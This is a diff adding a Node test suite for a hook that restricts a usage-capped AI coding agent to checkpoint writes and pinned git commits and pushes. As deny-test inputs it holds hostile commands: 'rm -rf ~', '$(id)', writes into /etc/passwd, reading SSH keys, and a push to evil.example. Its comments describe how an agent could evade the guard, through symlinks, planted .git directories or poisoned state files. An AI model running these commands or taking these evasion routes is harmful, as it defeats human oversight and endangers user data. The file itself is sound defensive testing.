@@ -1,0 +1,503 @@
+// TODO(LAR-483): coverage gaps (hard link on an existing checkpoint, shadowed worktree (d) checks)
+// and fixed-sleep timing across the suite.
+import { test, before } from 'node:test';
+import assert from 'node:assert';
+import {
+  mkdtempSync, mkdirSync, symlinkSync, writeFileSync, linkSync, copyFileSync, readFileSync,
+} from 'node:fs';
+import { spawnSync } from 'node:child_process';
+import path from 'node:path';
+import { fileURLToPath } from 'node:url';
+import { DEFAULTS } from '../lib/config.mjs';
+import {
+  NOW, tmpRoot, writeJson, git, runNode,
+} from './helpers.mjs';
+
+const GUARD = fileURLToPath(new URL('../scripts/usage-guard.mjs', import.meta.url));
+const tmp = tmpRoot('abw-guard-');
+const STATE = path.join(tmp, 'state');
+const RUNS = path.join(tmp, 'runs-not-created-yet', 'deeper');
+const HOME = path.join(tmp, 'home');
+mkdirSync(STATE, { recursive: true });
+mkdirSync(HOME, { recursive: true });
+process.env.ABW_STATE_DIR = STATE;
+process.env.ABW_RUNS_DIR = RUNS;
+process.env.HOME = HOME;
+
+const { decide } = await import('../scripts/usage-guard.mjs');
+
+const okUsage = { state: 'ok', fiveHour: { pct: 10, resetsAt: NOW + 1 }, sevenDay: null, capturedAt: NOW };
+const cappedUsage = { state: 'ok', fiveHour: { pct: 80, resetsAt: NOW + 1 }, sevenDay: null, capturedAt: NOW };
+const cfg = { ...DEFAULTS };
+const capped = (input) => decide({ cwd: tmp, ...input }, { usage: cappedUsage, config: cfg, home: HOME });
+const bash = (command) => ({ tool_name: 'Bash', tool_input: { command } });
+const write = (file_path, tool_name = 'Write') => ({ tool_name, tool_input: { file_path } });
+
+before(() => {
+  mkdirSync(path.join(tmp, 'outside'));
+  symlinkSync(path.join(tmp, 'outside'), path.join(STATE, 'escape'));
+  symlinkSync(path.join(tmp, 'outside', 'nope'), path.join(STATE, 'dangling'));
+  writeFileSync(path.join(tmp, 'outside', 'secret'), 'x');
+  linkSync(path.join(tmp, 'outside', 'secret'), path.join(STATE, 'hardlink'));
+});
+
+test('under the cap decide returns null even for destructive commands', () => {
+  const r = decide({ cwd: tmp, ...bash('rm -rf /tmp/x') }, { usage: okUsage, config: cfg, home: HOME });
+  assert.strictEqual(r, null);
+});
+
+test('capped deny reason is the exact copy', () => {
+  const r = capped({ tool_name: 'Read', tool_input: { file_path: '/x' } });
+  assert.strictEqual(
+    r.deny,
+    'Usage cap reached (5h 80% ≥ cap 75%). Write your checkpoint to the ticket plan, ' +
+      'commit and push the WIP branch, then return RESULT {"outcome":"capped"}. ' +
+      'No other tool calls are allowed.',
+  );
+});
+
+test('capped: checkpoint operations are allowed', () => {
+  assert.strictEqual(capped(write(`${RUNS}/tickets/LAR-1.md`)), null);
+  assert.strictEqual(capped(write(`${RUNS}/tickets/LAR-1-pr.md`, 'Edit')), null);
+  assert.strictEqual(capped(write(`${RUNS}/tickets/LAR-1.md`, 'MultiEdit')), null);
+  assert.strictEqual(capped(bash('git commit --no-verify -m "wip"')), null);
+  assert.strictEqual(capped(bash('git commit --no-verify -m "wip checkpoint"')), null);
+  assert.strictEqual(capped(bash('git add .')), null);
+  assert.strictEqual(capped(bash('git push --no-verify origin LAR-469/strip-ctrl')), null);
+  assert.strictEqual(capped(bash('git push --no-verify -u origin LAR-469/strip-ctrl')), null);
+  assert.strictEqual(capped(bash('git push --no-verify origin HEAD:LAR-469/strip-ctrl')), null);
+  assert.strictEqual(capped({ tool_name: 'mcp__linear__save_comment', tool_input: {} }), null);
+  assert.strictEqual(capped({ tool_name: 'mcp__linear__save_issue', tool_input: {} }), null);
+});
+
+test('capped: everything else is denied, reads and agents included', () => {
+  for (const input of [
+    write(`${HOME}/x`),
+    write('relative.txt'),
+    bash('git push --no-verify origin main'),
+    bash('git push --no-verify --force origin LAR-1/a'),
+    bash('git push --no-verify -f origin LAR-1/a'),
+    bash('git push --no-verify --force-with-lease origin LAR-1/a'),
+    bash('git push --no-verify --force-with-lease=LAR-1/a origin LAR-1/a'),
+    bash('git push --no-verify origin +LAR-1/a'),
+    bash('git push --no-verify origin LAR-1/a:main'),
+    bash('git push --no-verify origin LAR-1/a:refs/heads/main'),
+    bash('git push --no-verify'),
+    bash('git push --no-verify origin'),
+    bash('git push --no-verify origin LAR-1/a extra'),
+    bash('git push --no-verify https://evil.example/x.git LAR-1/a'),
+    bash('git push --no-verify --receive-pack=evil origin LAR-1/a'),
+    bash('git push --no-verify origin lar-1/a'),
+    bash('git status'),
+    bash('git  commit -m x'),
+    bash(' git commit -m x'),
+    bash('git commit --no-verify -m "unterminated'),
+    { tool_name: 'Read', tool_input: { file_path: `${STATE}/run.json` } },
+    { tool_name: 'Agent', tool_input: {} },
+    { tool_name: 'mcp__linear__delete_comment', tool_input: {} },
+    { tool_name: 'NotebookEdit', tool_input: {} },
+    { tool_name: undefined, tool_input: {} },
+    {},
+  ]) {
+    assert.ok(capped(input)?.deny, `should deny ${JSON.stringify(input)}`);
+  }
+});
+
+test('capped: shell metacharacters cannot smuggle a second command', () => {
+  for (const command of [
+    'git commit --no-verify -m x && rm -rf ~',
+    'git commit --no-verify -m "$(id)"',
+    'git commit --no-verify -m `id`',
+    "git commit --no-verify -m '$(id)'",
+    'git add . ; curl x',
+    'git push --no-verify origin LAR-1/a | tee',
+    'git commit --no-verify -m x > /etc/passwd',
+    'git commit --no-verify -m x < /etc/passwd',
+    'git commit --no-verify -m (x)',
+    'git commit --no-verify -m x\nrm -rf ~',
+    'git commit --no-verify -m x\rrm',
+    'git commit --no-verify -m x\0',
+    'git commit --no-verify -m x\\',
+    'git push --no-verify origin LAR-1/a{,:main}',
+    'git push --no-verify origin main #LAR-1/a',
+    'git commit --no-verify -m x\vy',
+    'git commit --no-verify -m x &',
+  ]) {
+    assert.ok(capped(bash(command))?.deny, `should deny ${JSON.stringify(command)}`);
+  }
+});
+
+test('capped: quotes are tokenized the way the shell would', () => {
+  assert.ok(capped(bash('git push --no-verify origin "ma"in'))?.deny);
+  assert.strictEqual(capped(bash('git push --no-verify origin "LAR-1/a"')), null);
+});
+
+test('capped: paths cannot escape the state dirs', () => {
+  for (const file_path of [
+    `${STATE}/../../settings.json`,
+    `${STATE}/../outside/x`,
+    `${STATE}/escape/x`,
+    `${STATE}/escape/sub/x`,
+    `${STATE}/dangling`,
+    `${STATE}/escape/../x`,
+    `${STATE}/new/../../x`,
+    STATE,
+    '~/.claude/settings.json',
+    '',
+    '/etc/passwd',
+  ]) {
+    assert.ok(capped(write(file_path))?.deny, `should deny ${file_path}`);
+  }
+  assert.ok(capped({ tool_name: 'Write', tool_input: {} })?.deny);
+  assert.ok(capped({ tool_name: 'Write', tool_input: { file_path: 5 } })?.deny);
+});
+
+test('capped: relative paths resolve against the hook cwd', () => {
+  assert.strictEqual(capped({ cwd: path.join(RUNS, 'tickets'), ...write('LAR-1.md') }), null);
+  assert.ok(capped({ cwd: RUNS, ...write('LAR-1.md') })?.deny);
+  assert.ok(capped({ cwd: undefined, ...write('LAR-1.md') })?.deny);
+});
+
+// Live review SEC1: run.json, history.json and window.json are orchestrator state. A capped
+// agent that could write them could point debriefPath at ~/.zshenv, poison the cost history or
+// forge the window, so the only writable files are the ticket plan and its PR body.
+test('capped: only tickets/<ID>.md and tickets/<ID>-pr.md under the runs dir are writable', () => {
+  for (const file_path of [
+    `${STATE}/run.json`,
+    `${STATE}/history.json`,
+    `${STATE}/window.json`,
+    `${STATE}/result-LAR-1.json`,
+    `${STATE}/new/dir/run.json`,
+    `${RUNS}/RUN_2027-01-01.md`,
+    `${RUNS}/tickets/../x.md`,
+    `${RUNS}/tickets/lar-1.md`,
+    `${RUNS}/tickets/LAR-1.txt`,
+    `${RUNS}/tickets/LAR-1-pr-2.md`,
+    `${RUNS}/tickets/LAR-1/x.md`,
+    `${RUNS}/tickets/sub/LAR-1.md`,
+    `${RUNS}/tickets`,
+    `${RUNS}/LAR-1.md`,
+  ]) {
+    assert.ok(capped(write(file_path))?.deny, `should deny ${file_path}`);
+  }
+  for (const file_path of [`${RUNS}/tickets/LAR-1.md`, `${RUNS}/tickets/LAR-1-pr.md`]) {
+    assert.strictEqual(capped(write(file_path)), null, `should allow ${file_path}`);
+  }
+});
+
+test('capped: an existing tickets dir does not open a .. or symlink escape', () => {
+  const tickets = path.join(RUNS, 'tickets');
+  mkdirSync(tickets, { recursive: true });
+  symlinkSync(path.join(tmp, 'outside', 'secret'), path.join(tickets, 'LAR-8.md'));
+  for (const file_path of [`${tickets}/../x.md`, `${tickets}/../RUN_2027-01-01.md`, `${tickets}/LAR-8.md`]) {
+    assert.ok(capped(write(file_path))?.deny, `should deny ${file_path}`);
+  }
+  assert.strictEqual(capped(write(`${tickets}/LAR-1.md`)), null);
+});
+
+test('stale or missing usage denies with the reason', () => {
+  const missing = { state: 'missing', fiveHour: null, sevenDay: null, capturedAt: null };
+  const stale = { ...okUsage, state: 'stale' };
+  const input = { cwd: tmp, tool_name: 'Read', tool_input: {} };
+  assert.match(decide(input, { usage: missing, config: cfg, home: HOME }).deny, /no usage reading/);
+  assert.match(decide(input, { usage: stale, config: cfg, home: HOME }).deny, /stale/);
+});
+
+// CLI: spawn the real script, as the hook runner does.
+const runCli = (input, env = {}) => runNode(GUARD, { input, env });
+
+const snapshotFile = (pct) => {
+  const now = Date.now() / 1000;
+  return writeJson(path.join(tmp, `snap-${pct}.json`), {
+    captured_at: now,
+    rate_limits: { five_hour: { used_percentage: pct, resets_at: now + 3600 } },
+  });
+};
+const cfgFile = path.join(tmp, 'config.yml');
+writeFileSync(cfgFile, 'usage_cap_5h: 75\n');
+const hook = JSON.stringify({ cwd: tmp, hook_event_name: 'PreToolUse', ...bash('rm -rf /tmp/x') });
+
+test('CLI: capped prints deny JSON, uncapped prints nothing', () => {
+  const env = { ABW_CONFIG: cfgFile };
+  const a = runCli(hook, { ...env, ABW_SNAPSHOT: snapshotFile(90) });
+  assert.strictEqual(a.status, 0);
+  const out = JSON.parse(a.stdout).hookSpecificOutput;
+  assert.strictEqual(out.hookEventName, 'PreToolUse');
+  assert.strictEqual(out.permissionDecision, 'deny');
+  assert.match(out.permissionDecisionReason, /^Usage cap reached \(5h 90% ≥ cap 75%\)/);
+  const b = runCli(hook, { ...env, ABW_SNAPSHOT: snapshotFile(10) });
+  assert.strictEqual(b.status, 0);
+  assert.strictEqual(b.stdout, '');
+});
+
+test('CLI: bad stdin, bad config and missing snapshot fail closed with valid JSON', () => {
+  const badCfg = path.join(tmp, 'bad.yml');
+  writeFileSync(badCfg, 'nonsense_key: 1\n');
+  const cases = [
+    runCli('{not json', { ABW_CONFIG: cfgFile, ABW_SNAPSHOT: snapshotFile(10) }),
+    runCli(hook, { ABW_CONFIG: badCfg, ABW_SNAPSHOT: snapshotFile(10) }),
+    runCli('null', { ABW_CONFIG: cfgFile, ABW_SNAPSHOT: snapshotFile(10) }),
+  ];
+  for (const r of cases) {
+    assert.strictEqual(r.status, 0);
+    const out = JSON.parse(r.stdout).hookSpecificOutput;
+    assert.strictEqual(out.permissionDecision, 'deny');
+    assert.match(out.permissionDecisionReason, /^Usage guard error \(.+\) — denying to stay safe\.$/);
+  }
+  const missing = runCli(hook, { ABW_CONFIG: cfgFile, ABW_SNAPSHOT: path.join(tmp, 'none.json') });
+  assert.match(JSON.parse(missing.stdout).hookSpecificOutput.permissionDecisionReason, /no usage reading/);
+});
+
+test('capped: glob and tilde expansion cannot rewrite the refspec or args', () => {
+  for (const command of [
+    'git push --no-verify origin LAR-1/*',
+    'git push --no-verify origin LAR-1/[x]',
+    'git push --no-verify origin LAR-1/?',
+    'git push --no-verify origin "LAR-1/*"',
+    'git add *',
+    'git add ~/.ssh',
+    'git commit --no-verify -m x*',
+  ]) {
+    assert.ok(capped(bash(command))?.deny, `should deny ${command}`);
+  }
+});
+
+test('capped: commit and add flags are a closed set, matched exactly', () => {
+  for (const command of [
+    'git commit --no-verify -F /etc/hosts',
+    'git commit --no-verify -F ~/.ssh/id_ed25519',
+    'git commit --no-verify --fil=/etc/hosts',
+    'git commit --no-verify --file=/etc/hosts',
+    'git commit --no-verify -m x --template=/etc/hosts',
+    'git commit --no-verify --pathspec-from-file=/etc/hosts -m x',
+    'git commit --no-verify --mess=x',
+    'git commit --no-verify -m',
+    'git commit --no-verify -am x',
+    'git commit --no-verify foo.txt',
+    'git add -f .env',
+    'git add --force .env',
+    'git add --pathspec-from-file=/etc/hosts',
+    'git add --al',
+  ]) {
+    assert.ok(capped(bash(command))?.deny, `should deny ${command}`);
+  }
+  for (const command of [
+    'git commit --no-verify -m "-weird start"',
+    'git commit --message=wip -a --no-verify -q',
+    'git commit --no-verify --all -m wip',
+    'git add -A',
+    'git add --all',
+    'git add -u src',
+    'git add --update',
+    'git add -- -f',
+    'git add src/a.js docs/b.md',
+  ]) {
+    assert.strictEqual(capped(bash(command)), null, `should allow ${command}`);
+  }
+});
+
+test('capped: push remote is pinned to origin, and may not delete a branch', () => {
+  assert.strictEqual(capped(bash('git push --no-verify origin LAR-1/a')), null);
+  for (const command of [
+    'git push --no-verify .. LAR-1/a',
+    'git push --no-verify . LAR-1/a',
+    'git push --no-verify /tmp/repo LAR-1/a',
+    'git push --no-verify upstream LAR-1/a',
+    'git push --no-verify evilrepo LAR-1/a',
+    'git push --no-verify origin :LAR-2/other',
+  ]) {
+    assert.ok(capped(bash(command))?.deny, `should deny ${command}`);
+  }
+});
+
+test('capped: a hard-linked ticket plan is denied', () => {
+  const tickets = path.join(RUNS, 'tickets');
+  mkdirSync(tickets, { recursive: true });
+  linkSync(path.join(tmp, 'outside', 'secret'), path.join(tickets, 'LAR-7.md'));
+  assert.ok(capped(write(`${tickets}/LAR-7.md`))?.deny);
+  assert.ok(capped(write(`${STATE}/hardlink`))?.deny);
+});
+
+test('capped: a relative home denies a ~/ path, even when it lands in the state dir', () => {
+  // The state dir is <cwd>/relative, so the old expansion (`relative/x`, resolved against the
+  // process cwd) would land inside it and be allowed.
+  const saved = process.env.ABW_STATE_DIR;
+  const prevCwd = process.cwd();
+  const cwd = mkdtempSync(path.join(tmp, 'cwd-'));
+  mkdirSync(path.join(cwd, 'relative'));
+  process.env.ABW_STATE_DIR = path.join(cwd, 'relative');
+  try {
+    process.chdir(cwd);
+    const r = decide({ cwd, ...write('~/x') }, { usage: cappedUsage, config: cfg, home: 'relative' });
+    assert.ok(r?.deny);
+  } finally {
+    process.chdir(prevCwd);
+    process.env.ABW_STATE_DIR = saved;
+  }
+});
+
+test('CLI: a broken or missing lib fails closed instead of exiting 1 with no JSON', () => {
+  for (const mode of ['throws', 'missing', 'hangs']) {
+    const dir = mkdtempSync(path.join(tmp, 'copy-'));
+    mkdirSync(path.join(dir, 'scripts'));
+    mkdirSync(path.join(dir, 'lib'));
+    copyFileSync(GUARD, path.join(dir, 'scripts', 'usage-guard.mjs'));
+    if (mode === 'hangs') {
+      // An import that never settles ends node with exit 13 and no output (fail open).
+      writeFileSync(path.join(dir, 'lib', 'config.mjs'), 'await new Promise(() => {});\n');
+      writeFileSync(path.join(dir, 'lib', 'usage.mjs'), 'export {};\n');
+    }
+    if (mode === 'throws') {
+      writeFileSync(path.join(dir, 'lib', 'config.mjs'), "throw new Error('boom');\n");
+      writeFileSync(path.join(dir, 'lib', 'usage.mjs'), 'export {};\n');
+    }
+    const r = runNode(path.join(dir, 'scripts', 'usage-guard.mjs'), { input: hook });
+    assert.strictEqual(r.status, 0, mode);
+    const out = JSON.parse(r.stdout).hookSpecificOutput;
+    assert.strictEqual(out.permissionDecision, 'deny', mode);
+    assert.match(out.permissionDecisionReason, /^Usage guard error/, mode);
+  }
+});
+
+test('capped: git -C is allowed only for a real linked worktree named like a ticket', () => {
+  const main = path.join(tmp, 'x', 'repo');
+  mkdirSync(main, { recursive: true });
+  git('-C', main, 'init', '-q');
+  git('-C', main, 'commit', '-q', '--allow-empty', '-m', 'i');
+  const wts = path.join(tmp, 'x', 'repo-worktrees');
+  const wt = path.join(wts, 'LAR-1');
+  git('-C', main, 'worktree', 'add', '-q', '-b', 'LAR-1/a', wt);
+  assert.strictEqual(capped(bash(`git -C ${wt} add -A`)), null);
+  assert.strictEqual(capped(bash(`git -C ${wt} commit --no-verify -m wip`)), null);
+  assert.strictEqual(capped(bash(`git -C ${wt} push --no-verify origin LAR-1/a`)), null);
+  assert.strictEqual(capped(bash(`git -C ${wt} push --no-verify origin HEAD:LAR-1/a`)), null);
+  // Live review SEC6: from a worktree, the push lands on that worktree's own ticket branch only.
+  for (const refspec of ['LAR-2/other', 'HEAD:LAR-2/other', 'LAR-10/a', 'HEAD:LAR-10/a', 'LAR-1']) {
+    assert.ok(capped(bash(`git -C ${wt} push --no-verify origin ${refspec}`))?.deny,
+      `should deny a push of ${refspec} from LAR-1`);
+  }
+
+  const denied = (dir, why) =>
+    assert.ok(capped(bash(`git -C ${dir} commit --no-verify -m wip`)), `should deny: ${why}`);
+  // The C1 sequence: Write a .git/config under runs, create it, then try to use the directory.
+  // The write itself is now denied (SEC1); the directory is planted by hand to test -C anyway.
+  const planted = path.join(RUNS, 'a-worktrees', 'LAR-2');
+  assert.ok(capped(write(path.join(planted, '.git', 'config')))?.deny);
+  mkdirSync(path.join(planted, '.git'), { recursive: true });
+  writeFileSync(path.join(planted, '.git', 'config'), '[core]\n');
+  denied(planted, 'planted .git directory in runs');
+  // A planted .git file in runs pointing at a planted gitdir in runs.
+  const planted2 = path.join(RUNS, 'b-worktrees', 'LAR-3');
+  const fakeGitdir = path.join(RUNS, 'b', '.git', 'worktrees', 'LAR-3');
+  mkdirSync(planted2, { recursive: true });
+  mkdirSync(fakeGitdir, { recursive: true });
+  writeFileSync(path.join(planted2, '.git'), `gitdir: ${fakeGitdir}\n`);
+  denied(planted2, 'planted .git file in runs');
+  // Not a ticket id, and a real .git directory.
+  mkdirSync(path.join(tmp, 'evil-worktrees', 'x'), { recursive: true });
+  denied(path.join(tmp, 'evil-worktrees', 'x'), 'basename is not a ticket id');
+  mkdirSync(path.join(tmp, 'evil-worktrees', 'LAR-9', '.git'), { recursive: true });
+  denied(path.join(tmp, 'evil-worktrees', 'LAR-9'), '.git is a directory');
+  // Nested inside the agent's own worktree.
+  const nested = path.join(wt, 'inner-worktrees', 'LAR-3');
+  mkdirSync(nested, { recursive: true });
+  writeFileSync(path.join(nested, '.git'), readFileSync(path.join(wt, '.git'), 'utf8'));
+  denied(nested, 'nested inside a worktree');
+  // A .git file whose gitdir is outside the <X>/.git/worktrees/<name> shape.
+  const odd = path.join(wts, 'LAR-4');
+  mkdirSync(odd, { recursive: true });
+  mkdirSync(path.join(tmp, 'x', 'plain-gitdir'));
+  writeFileSync(path.join(odd, '.git'), `gitdir: ${path.join(tmp, 'x', 'plain-gitdir')}\n`);
+  denied(odd, 'gitdir has the wrong shape');
+  // A .git symlink, even to a valid gitdir file.
+  const link = path.join(wts, 'LAR-5');
+  mkdirSync(link, { recursive: true });
+  symlinkSync(path.join(wt, '.git'), path.join(link, '.git'));
+  denied(link, '.git is a symlink');
+  // Other cases: main repo, the parent itself, relative dir, double -C, -C after subcommand.
+  for (const cmd of [
+    `git -C ${main} commit --no-verify -m wip`,
+    `git -C ${wts} commit --no-verify -m wip`,
+    'git -C LAR-1 commit --no-verify -m wip',
+    `git -C ${wt} -C ${wt} commit -m wip`,
+    `git commit --no-verify -C ${wt} -m wip`,
+    `git -c core.editor=x -C ${wt} commit -m wip`,
+    `git -C ${wt} status`,
+  ]) assert.ok(capped(bash(cmd)), `should deny: ${cmd}`);
+});
+
+// Live review SEC7: a capped commit or push must not run worktree hooks (husky, lefthook) the
+// agent may have edited, so --no-verify is required on both.
+test('capped: commit and push without --no-verify are denied', () => {
+  for (const command of [
+    'git commit -m wip',
+    'git commit -a -m wip',
+    'git push origin LAR-1/a',
+    'git push -u origin LAR-1/a',
+  ]) {
+    assert.ok(capped(bash(command))?.deny, `should deny ${command}`);
+  }
+  assert.strictEqual(capped(bash('git commit -m wip --no-verify')), null);
+  assert.strictEqual(capped(bash('git push origin LAR-1/a --no-verify')), null);
+  assert.strictEqual(capped(bash('git add -A')), null); // add runs no hooks
+});
+
+// Live review SEC6/TST13: a refspec with a second colon is not a branch name.
+test('capped: a refspec with more than one colon is denied', () => {
+  for (const command of [
+    'git push --no-verify origin HEAD:LAR-1/a:main',
+    'git push --no-verify origin LAR-1/a:LAR-1/b:main',
+  ]) {
+    assert.ok(capped(bash(command))?.deny, `should deny ${command}`);
+  }
+});
+
+// The hook command string the agent ships. Claude Code only blocks on exit 2, so the guard must
+// never exit 127 (no node), 1 or a signal code unnoticed.
+const agentText = readFileSync(
+  fileURLToPath(new URL('../agents/agentic-ticket-worker.md', import.meta.url)), 'utf8');
+const HOOK_COMMAND = agentText.match(/^\s+command: '(.+)'$/m)[1];
+
+function runHookCommand(env) {
+  const home = path.join(tmp, `hookhome-${Math.random().toString(36).slice(2)}`);
+  const scripts = path.join(home, '.claude', 'skills', 'agentic-backlog-worker', 'scripts');
+  mkdirSync(scripts, { recursive: true });
+  symlinkSync(GUARD, path.join(scripts, 'usage-guard.mjs'));
+  return spawnSync('/bin/sh', ['-c', HOOK_COMMAND], {
+    input: hook,
+    encoding: 'utf8',
+    env: { HOME: home, ABW_CONFIG: cfgFile, ABW_SNAPSHOT: snapshotFile(10), ...env },
+  });
+}
+
+test('hook command: a working guard exits 0 (proves the harness before the failure cases)', () => {
+  const r = runHookCommand({ PATH: process.env.PATH });
+  assert.strictEqual(r.status, 0, r.stderr);
+  assert.strictEqual(r.stdout, '');
+});
+
+// Live review TST1: the uncapped run above would still pass if entry-point detection broke and
+// the guard silently allowed everything. These two must deny through the same symlinked layout.
+test('hook command: capped and missing-snapshot runs deny through the symlinked install', () => {
+  for (const [why, snapshot] of [['capped at 95%', snapshotFile(95)], ['missing', path.join(tmp, 'none.json')]]) {
+    const r = runHookCommand({ PATH: process.env.PATH, ABW_SNAPSHOT: snapshot });
+    assert.strictEqual(r.status, 0, `${why}: ${r.stderr}`);
+    let out;
+    assert.doesNotThrow(() => { out = JSON.parse(r.stdout); }, `${why}: ${r.stdout}`);
+    assert.strictEqual(out.hookSpecificOutput.permissionDecision, 'deny', why);
+  }
+});
+
+test('hook command: node missing from PATH exits 2 so the call is blocked', () => {
+  const r = runHookCommand({ PATH: path.join(tmp, 'no-node-here') });
+  assert.strictEqual(r.status, 2, r.stderr);
+});
+
+test('hook command: a missing script exits 2 so the call is blocked', () => {
+  const home = path.join(tmp, 'hookhome-empty');
+  mkdirSync(home, { recursive: true });
+  const r = spawnSync('/bin/sh', ['-c', HOOK_COMMAND], {
+    input: hook, encoding: 'utf8', env: { HOME: home, PATH: process.env.PATH },
+  });
+  assert.strictEqual(r.status, 2, r.stderr);
+});
